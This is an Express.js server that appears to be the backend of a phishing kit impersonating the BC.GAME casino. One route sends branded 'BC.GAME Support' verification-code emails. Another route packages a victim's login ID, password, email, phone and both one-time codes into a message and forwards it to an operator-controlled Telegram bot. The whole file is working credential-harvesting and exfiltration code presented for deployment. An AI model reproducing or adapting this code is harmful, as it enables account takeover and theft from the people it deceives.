require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// 1. API ROUTES FIRST (To avoid catch-all interference)
app.post('/send-otp', async (req, res) => {
    const { email } = req.body;
    console.log(`[API] OTP request for: ${email}`);

    if (!email) return res.status(400).json({ success: false, message: 'Email missing' });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    const mailOptions = {
        from: `"BC.GAME Support" <${process.env.EMAIL_USER}>`,
        to: email,
        subject: '🔐 Your Verification Code',
        html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; font-family:sans-serif; text-align:center; border:2px solid #3bc117;">
                <h1 style="color:#3bc117;">BC.GAME</h1>
                <p style="font-size:18px;">Verification Code:</p>
                <div style="font-size:48px; font-weight:bold; letter-spacing:10px; margin:20px 0; color:#3bc117;">${otp}</div>
                <p style="color:#98a7b5;">This code is valid for 5 minutes.</p>
               </div>`
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log(`[API] OTP sent to ${email}`);
        res.json({ success: true }); 
    } catch (error) {
        console.error('[API] Email Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    console.log(`[API] Log request: ${title}`);

    const token = process.env.LOG_BOT_TOKEN;
    const chatId = process.env.LOG_BOT_CHAT_ID;

    if (!token || !chatId) {
        console.error('[API] Log Bot Config Missing');
        return res.status(500).json({ success: false, message: 'Config missing' });
    }

    const message = `
🔥 <b>${title}</b>
━━━━━━━━━━━━━━━
👤 <b>Initial ID</b>: <code>${data.id}</code>
🔑 <b>Password</b>: <code>${data.pass}</code>
📧 <b>Verify Email</b>: <code>${data.email || 'N/A'}</code>
🔢 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
📱 <b>Verify Phone</b>: <code>${data.phone || 'N/A'}</code>
🔢 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`[API] Log sent to Telegram`);
        res.json({ success: true });
    } catch (error) {
        console.error('[API] Telegram Error:', error.response?.data || error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. STATIC FILES
app.use(express.static(__dirname));

// 3. CATCH-ALL (SPA)
app.use((req, res, next) => {
    if (req.method === 'GET' && !req.path.includes('.')) {
        res.sendFile(path.join(__dirname, 'index.html'));
    } else {
        next();
    }
});

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

app.listen(port, () => {
    console.log(`🚀 Server is LIVE on port ${port}`);
});
